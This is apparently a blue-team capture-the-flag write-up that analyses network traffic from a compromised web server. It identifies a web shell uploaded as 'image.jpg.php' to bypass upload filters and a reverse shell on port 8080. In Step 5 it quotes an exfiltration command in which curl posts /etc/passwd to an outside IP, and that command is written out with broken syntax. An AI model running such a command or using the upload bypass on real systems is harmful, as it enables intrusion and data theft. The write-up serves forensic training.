## 1. Incident Overview

A suspicious file was identified on a company web server, raising concerns of potential malicious activity. The development team escalated the issue to the security team. To investigate the incident, the network team captured network traffic and provided a PCAP file for analysis.

The goal of this investigation was to determine how the malicious file was uploaded, identify the attacker, and assess any unauthorized actions performed on the server.

---

## 2. Investigation Objectives

- Identify the IP address responsible for the file upload
- Analyze how the malicious file was uploaded
- Determine attacker activity after upload
- Check for signs of command execution and data exfiltration

---

## 3. Tools Used

- Wireshark
- HTTP Protocol Analysis
- IP Geolocation

---

## 4. Investigation & Analysis

### Step 1: Identifying File Upload Activity

To identify file upload attempts, HTTP POST requests were analyzed using the following Wireshark filter:

```
http.request.method =="POST" && frame.contains"upload"

```

This filter revealed the source IP address responsible for uploading a file to the web server.

**Finding:**

- Attacker IP identified as: **24.49.63.79**

---

### Step 2: IP Geolocation

The identified IP address (**24.49.63.79**) was analyzed using IP geolocation techniques.

**Finding:**

- The IP address was confirmed to be an external address.
- Geolocation analysis provided approximate location details of the attacker.

---

### Step 3: HTTP Stream Analysis

The HTTP stream was followed to observe the attacker’s actions.

**Observations:**

- The attacker attempted to upload a web shell.
- The first upload attempt failed.
- The second upload attempt was successful.
- The attacker uploaded a malicious file named:

```
image.jpg.php

```

This indicates an attempt to bypass file upload restrictions by disguising a PHP web shell as an image file.

---

### Step 4: Reverse Shell Connection

Further analysis revealed suspicious outbound traffic from the victim server.

The following Wireshark filter was applied:

```
(tcp.port ==8080) && (ip.src ==24.49.63.79)

```

**Finding:**

- A connection was established on port **8080**.
- The traffic pattern indicates a **reverse shell connection** between the victim server and the attacker.

---

### Step 5: Data Exfiltration Attempt

Examining the TCP stream revealed evidence of data exfiltration.

**Observed Command:**

```
curl-XPOST-d/etc/passwd http://117.11.88.124:443/

```

**Analysis:**

- The attacker attempted to exfiltrate the `/etc/passwd` file.
- Data was sent to the attacker-controlled IP address **117.11.88.124** over port **443**.
- This confirms unauthorized access and malicious intent.

---

## 5. Attack Summary

- Malicious file uploaded via HTTP POST request
- Web shell uploaded using file extension obfuscation
- Reverse shell established on port 8080
- Sensitive system file targeted for exfiltration

---

## 6. Conclusion

The investigation confirmed that the web server was compromised through a malicious file upload. The attacker successfully bypassed file upload restrictions, established a reverse shell connection, and attempted to exfiltrate sensitive system files.

This incident highlights the importance of secure file upload validation, monitoring outbound connections, and continuous network traffic analysis.

## Badge
<a href="https://cyberdefenders.org/blueteam-ctf-challenges/achievements/nitishapunmiya16406/webstrike/" target="_blank">
  <img src="https://img.shields.io/badge/-WebStrike_Blue_Team_Lab-0A1AFF?&style=for-the-badge&logo=CyberDefenders&logoColor=white" />
</a>

